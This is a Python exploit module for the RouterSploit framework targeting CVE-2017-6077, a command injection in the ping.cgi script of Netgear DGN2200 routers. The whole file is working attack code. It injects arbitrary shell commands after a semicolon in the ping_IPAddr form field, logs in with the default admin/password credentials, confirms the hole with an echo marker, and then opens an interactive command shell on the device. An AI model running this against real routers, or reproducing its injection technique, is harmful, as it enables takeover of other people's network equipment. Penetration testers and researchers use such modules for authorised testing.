from routersploit import (
    exploits,
    print_error,
    print_success,
    print_status,
    mute,
    validators,
    http_request,
    random_text,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploits Netgear DGN2200 RCE vulnerability in ping.cgi
    """
    __info__ = {
        'name': 'Netgear DGN2200 RCE',
        'description': 'Exploits Netgear DGN2200 RCE vulnerability in the ping.cgi script',
        'authors': [
            'SivertPL',  # vulnerability discovery
            'Josh Abraham <sinisterpatrician[at]google.com>',  # routesploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/41394/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6077',
        ],
        'devices': [
            'Netgear DGN2200v1',
            'Netgear DGN2200v2',
            'Netgear DGN2200v3',
            'Netgear DGN2200v4',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target Port')  # target port

    login = exploits.Option('admin', 'Username')
    password = exploits.Option('password', 'Password')

    def run(self):
        """
        Method run on "exploit" or "run" command (both works the same way). It should result in exploiting target.
        """
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, command):
        url = "{}:{}/ping.cgi".format(self.target, self.port)
        data = {'IPAddr1': 12, 'IPAddr2': 12, 'IPAddr3': 12, 'IPAddr4': 12, 'ping': "Ping", 'ping_IPAddr': "12.12.12.12; " + command}
        referer = "{}/DIAG_diag.htm".format(self.target)
        headers = {'referer': referer}

        r = http_request(method="POST", url=url, data=data, auth=(self.login, self.password), headers=headers)
        if r is None:
            return ""

        result = self.parse_output(r.text)
        return result.encode('utf-8')

    def parse_output(self, text):
        yet = False
        result = []
        for line in text.splitlines():
            if line.startswith("<textarea"):
                yet = True
                continue
            if yet:
                if line.startswith("</textarea>"):
                    break
                result.append(line)
        return "\n".join(result)

    @mute
    def check(self):
        """
        Method that verifies if the target is vulnerable.
        """
        rand_marker = random_text(6)
        command = "echo {}".format(rand_marker)

        if rand_marker in self.execute(command):
            return True

        return False
